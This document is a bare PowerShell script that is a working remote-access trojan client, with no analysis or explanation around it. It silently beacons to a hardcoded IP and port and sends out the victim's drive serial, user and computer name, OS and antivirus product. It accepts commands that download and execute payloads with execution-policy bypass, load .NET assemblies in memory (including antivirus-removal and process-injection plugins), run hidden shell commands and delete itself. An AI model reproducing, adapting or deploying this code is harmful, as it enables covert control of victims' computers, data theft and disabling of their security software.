Add-Type -AssemblyName Microsoft.VisualBasic

$shellobj = New-Object -ComObject 'wscript.shell'
$httpobj =  New-Object -ComObject 'msxml2.xmlhttp'
$Fs = New-Object -comObject 'Scripting.FileSystemObject'

[String] $IP = '103.133.215.16'
[String] $Port = '3000'
[String] $Splitter = 'qiQqi'
[String] $sleepSec = 3

$ErrorActionPreference = 'SilentlyContinue'

$NT,$hwid,$AV

Start-Sleep -Seconds $sleepSec

try {
$hwid = $Fs.GetDrive($pwd.drive.name).SerialNumber
$hwid = "{0:X}" -f $hwid
}
catch {
 $hwid = 'Error'
}

try {
$AV = (Get-WmiObject -Namespace 'root/SecurityCenter2' -Class 'AntiVirusProduct').displayname;
    if ($AV -eq $null) 
    {$AV = 'NAN/AV'}
}
catch {
  $AV = 'NAN/AV'
}

try {
 $regValue = $shellobj.RegRead("HKEY_CURRENT_USER\SOFTWARE\" + $hwid + "\" + "Note")
if ($regValue -eq '') { 
  $NT ='Nothing'
} else {
  $NT = $regValue
}
}
catch {
  $NT ='Nothing'
}



Function HTTP($DA, $Param) {
    [String] $Response = [String]::Empty
    try
    {
        $httpobj.Open('POST', 'http://' + $IP + ':' + $Port + '/' + $DA, $false)
        $httpobj.SetRequestHeader('User-Agent:', $hwid + $Splitter+ $NT + $Splitter + ($env:COMPUTERNAME) + $Splitter + ($env:UserName) + $Splitter + (Get-WmiObject Win32_OperatingSystem).Caption + $Splitter + $Splitter + "0.1" + $Splitter + $AV + $Splitter + "Powershell" + $Splitter)
        $httpobj.Send($Param)
        $Response = [Convert]::ToString($httpobj.ResponseText)
    } catch { }
    return $Response
}


while($true)
{
    $A = [Microsoft.VisualBasic.Strings]::Split((HTTP("ready", "")) , $Splitter)

    switch($A[0]) {

        'close' {
            [Environment]::Exit(0)
        break }

         'restart' {
            $ScriptName = $MyInvocation.MyCommand.Path
            if ([IO.Path]::GetExtension($ScriptName) -eq '.ps1') { 
         	  $shellobj.Run("powershell.exe -executionpolicy bypass -file " + """" + $ScriptName + """",0)
              [Environment]::Exit(0)
              }
        break }


        'UNS' {
            $ScriptName = $MyInvocation.MyCommand.Path
            if ([IO.Path]::GetExtension($ScriptName) -eq '.ps1') { 
         	  $Fs.DeleteFile($ScriptName)
              [Environment]::Exit(0)
              }
        break }


         'DW' {
         $Tmpfile = $shellobj.expandenvironmentstrings("%temp%") + "\" + $A[1]
         $bytes = [Convert]::FromBase64String($A[2])
         [IO.File]::WriteAllBytes($Tmpfile, $bytes)
         if ([IO.Path]::GetExtension($Tmpfile) -eq '.ps1') { 
         	 $shellobj.Run("powershell.exe -executionpolicy bypass -file " + """" + $Tmpfile + """",0)
         } else {
             $shellobj.Run( """" + $Tmpfile + """")
           }
        break }


        'exc' {
           $Tmpfile = $shellobj.expandenvironmentstrings("%temp%") + "\" + $A[2]
           $WebClient=New-Object net.webclient
           $WebClient.DownloadFile($A[1],$Tmpfile)
           $shellobj.Run( """" + $Tmpfile + """")
        break }


        'memory' {
         $job  = start-job { [AppDomain]::CurrentDomain.Load([Convert]::Frombase64String($using:A[1])).EntryPoint.invoke($null,$null) }
        break }

        'bot' {
         $job  = start-job { [Reflection.Assembly]::Load([Convert]::Frombase64String($using:A[1])).GetType('BotKiller.Class1').GetMethod('Plugins').Invoke($null,$null) }
        break }

        'WD' {
         $job  = start-job { [Reflection.Assembly]::Load([Convert]::Frombase64String($using:A[1])).GetType('WD.Class1').GetMethod('Plugins').Invoke($null,$null) }
        break }

        'AV' {
         $job  = start-job { [Reflection.Assembly]::Load([Convert]::Frombase64String($using:A[1])).GetType('AVRemoval.Class1').GetMethod('Plugins').Invoke($null,$null) }
        break }

         'PE' {
         $job  = start-job { [Reflection.Assembly]::Load([Convert]::Frombase64String($using:A[1])).GetType('SendToMemory.Class1').GetMethod('Plugins').Invoke($null,[object[]] ($using:A[2],[Convert]::Frombase64String($using:A[3]))) }
        break }

        'vurl' {
            $shellobj.Run($A[1])
        break }

         'hurl' {
          $i = New-Object -ComObject 'internetexplorer.application'
          $i.navigate($A[1])
		  $i.visible=0
        break }


        'shellfuc' {
            $shellobj.Run($A[1],0)
        break }


        'Note' {
           $NT = $A[1]
           $shellobj.RegWrite("HKEY_CURRENT_USER\SOFTWARE\" + $hwid + "\" + "Note",$A[1],"REG_SZ")
        break }

    }
    Start-Sleep -Milliseconds 2000
}
